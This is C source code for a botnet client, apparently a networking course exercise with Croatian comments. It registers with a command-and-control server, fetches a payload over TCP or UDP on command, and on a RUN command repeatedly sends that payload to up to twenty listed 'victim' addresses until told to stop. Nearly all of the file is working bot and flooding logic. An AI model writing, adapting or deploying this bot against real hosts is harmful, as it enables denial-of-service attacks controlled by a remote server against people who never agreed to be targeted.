#include <stdio.h>
#include <err.h> //errx
#include <unistd.h> //getopt
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <poll.h>

#define QUIT '0'
#define PROG_TCP '1'
#define PROG_UDP '2'
#define RUN '3'
#define STOP '4'
#define MAXLEN 512

int Socket(int family, int type, int protocol);
struct addrinfo * Getaddrinfo(const char*hostname, const char*service, int family, int socktype);
void Bind(int sockfd, const struct sockaddr *myaddr, int addrlen);
void Recvfrom(int sock, char* buf, int size, struct sockaddr *cli, socklen_t *clilen);
void Sendto(int sock, void* buf, int size, struct sockaddr* cli, socklen_t clilen);
void Connect(int sock, struct sockaddr* addr, socklen_t addrlen);
void Write(int sockfd, char *buf, int num);
void Read(int sockfd, char *buf, int max);
void Setsockopt(int sockfd, int level, int sockname, const void *opval, socklen_t optlen);

typedef struct victim {
	char ip[INET_ADDRSTRLEN];
	char port[22];
} victim;

typedef struct MSG {
	char command;
	victim victims[20];
} MSG;

int attack(struct MSG *msg, char * payload, int ccsock, int mysock) {
	int i = 0;
	char *victimip;
	char *victimport;
	struct addrinfo* vicaddrinfo;
	struct pollfd fds[20];
	memset(&fds, 0, sizeof(fds));
	int fdnum = 0;
	int poll_ret;
	struct sockaddr_in vicaddrs[20];
	memset(&vicaddrs, 0, sizeof(vicaddrs));
	socklen_t servlen = sizeof(struct sockaddr_in);
	char buff[MAXLEN];
	struct sockaddr cli;
	socklen_t clilen = sizeof(cli);
	int nrOfVictims = 0;
	
	while (strlen(msg -> victims[i].ip) > 0) {
		victimip = msg->victims[i].ip;
		victimport = msg->victims[i].port;
		
		vicaddrinfo = Getaddrinfo(victimip, victimport, AF_INET, SOCK_DGRAM);
		
		vicaddrs[i].sin_family = AF_INET;
		vicaddrs[i].sin_port = ((struct sockaddr_in *)vicaddrinfo-> ai_addr) -> sin_port;
		inet_pton(AF_INET, victimip, &(vicaddrs[i].sin_addr));
		
		i++;
		nrOfVictims++;
	}
	
	fds[0].fd = ccsock;
	fds[0].events = POLLIN;
	
	fds[1].fd = mysock;
	fds[1].events = POLLIN;
	
	fdnum = 2;
	
	for(int i=0; i < 100; i++) {
		
		for(int j = 0; j < nrOfVictims; j++) {
			//razbijanje payloada
			int index = 0;
			int len = strlen(payload);
			char token[len];
			memset(token, 0, len);
   
			while (index < len) {
				if(strncmp(&payload[index], ":", 1) != 0) {
					strncat(token, &payload[index], 1);
				} else {
					strncat(token, "\0", 1);
					int token_len = strlen(token);
					Sendto(mysock, token, token_len, (struct sockaddr *)&vicaddrs[j], servlen);
					memset(token, 0, len);
				}
				index++;
			}
		}
		
		poll_ret = poll(fds, fdnum, 1000);
		
		if(poll_ret < 0) {
			errx(2, "Fatal error - poll");
		} else if (poll_ret == 0) {
			continue;
		} else if (poll_ret > 0) {
			int pollin = 0;
			if (fds[0].revents & POLLIN) { //provjeravamo je li od ccsocka
				pollin = 1;
				Recvfrom(ccsock, buff, MAXLEN, &cli, &clilen);
				if(buff[0] == STOP) {
					return 0;
				} else if (buff[0] == QUIT){
					return 1;
				} else {
					break;
				}
			} else { //od neke zrtve je
				pollin = 1;
				Recvfrom(mysock, buff, MAXLEN, &cli, &clilen);
				return 0;
			}
			
			if(!pollin) {
				errx(2, "Fatal error - poll");
			}
		}
	}
	return 0;
}

int main(int argc, char *argv[]) {
	int ch;
	char* ccserver_ip;
	char* ccserver_port;
	int ccsock;
	struct sockaddr_in ccservaddr, servaddr;
	char *reg = "REG\n";
	char *hello = "HELLO\n";
	char payload[MAXLEN];
	memset(payload, 0, MAXLEN);
	strncat(payload, ":", 1);
	struct addrinfo* myaddrinfo;
	int mysock;
	int sock;
	
	struct addrinfo *cc;
	struct addrinfo *server_res;
	int quit = 0;
	
	int msglen = sizeof(struct MSG);
	char buffer[msglen];
	memset(&buffer, 0, MAXLEN);
	struct MSG* msg;
	
	while((ch = getopt(argc, argv, "")) != -1) {
		switch(ch) {
			default: 
				errx(1, "Usage: ./bot ip  port\n");
				break;
		}
	}
	
	if(argc != 3) {
		errx(1, "Usage: ./bot server_ip server_port\n");
	}
	
	int on=1;
	
	ccserver_ip = argv[1];
	ccserver_port = argv[2];
	
	cc = Getaddrinfo(ccserver_ip, ccserver_port, AF_INET, SOCK_DGRAM);
	ccsock = Socket(cc->ai_family,cc->ai_socktype,cc->ai_protocol);
	Setsockopt(ccsock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
	
	
	
	myaddrinfo = Getaddrinfo("127.0.0.1", NULL, AF_INET, SOCK_DGRAM);
	mysock = Socket(myaddrinfo->ai_family, myaddrinfo->ai_socktype, myaddrinfo->ai_protocol);
	Setsockopt(mysock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on));
	Setsockopt(mysock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
	
	memset(&ccservaddr, 0, sizeof(ccservaddr));
	ccservaddr.sin_family = AF_INET;
	ccservaddr.sin_port = ((struct sockaddr_in *)cc -> ai_addr) -> sin_port;
	inet_pton(AF_INET, ccserver_ip, &(ccservaddr.sin_addr));
	
	socklen_t servlen = sizeof(ccservaddr);
	Sendto(ccsock, reg, sizeof(reg), (struct sockaddr *)&ccservaddr, servlen);
	
	while(1) {
		Recvfrom(ccsock, (char *)buffer, sizeof(MSG), (struct sockaddr *) &ccservaddr, &servlen);
		msg = (struct MSG *) buffer;
		char cmd = msg -> command;
		
		if(cmd == PROG_UDP) {
			
			server_res = Getaddrinfo(msg -> victims[0].ip, msg -> victims[0].port, AF_INET, SOCK_DGRAM);
			sock = Socket(server_res->ai_family, server_res->ai_socktype, server_res->ai_protocol);
			
			memset(&servaddr, 0, sizeof(servaddr));
			servaddr.sin_family = AF_INET;
			servaddr.sin_port = ((struct sockaddr_in *)server_res -> ai_addr) -> sin_port;
			inet_pton(AF_INET, msg -> victims[0].ip, &(servaddr.sin_addr));
					
			Sendto(sock, hello, strlen(hello), (struct sockaddr *) &servaddr, servlen);
			Recvfrom(sock, payload, MAXLEN, (struct sockaddr *) &servaddr, &servlen);
			
			close(sock);
			continue;
			
		} else if (cmd == PROG_TCP) {
			server_res = Getaddrinfo(msg -> victims[0].ip, msg -> victims[0].port, AF_INET, SOCK_STREAM);
			sock = Socket(server_res->ai_family, server_res->ai_socktype, server_res->ai_protocol);
				
			memset(&servaddr, 0, sizeof(servaddr));
			servaddr.sin_family = AF_INET;
			servaddr.sin_port = ((struct sockaddr_in *)server_res -> ai_addr) -> sin_port;
			inet_pton(AF_INET, msg -> victims[0].ip, &(servaddr.sin_addr));
				
			Connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr));
			Write(sock, hello, strlen(hello));
			Read(sock, payload, MAXLEN);
			
			close(sock);
			continue;
		} else if (cmd == QUIT) {
			break;
		} else if (cmd == RUN) {
			quit = attack(msg, payload, ccsock, mysock);
			if (quit == 1) {
				break;
			}
		} else if (cmd == STOP) {
			continue;
		} else {
			printf("Kriva naredba od cc servera.\n");
		}
	}
	
	close(ccsock);
	close(mysock);
	return 0;
}
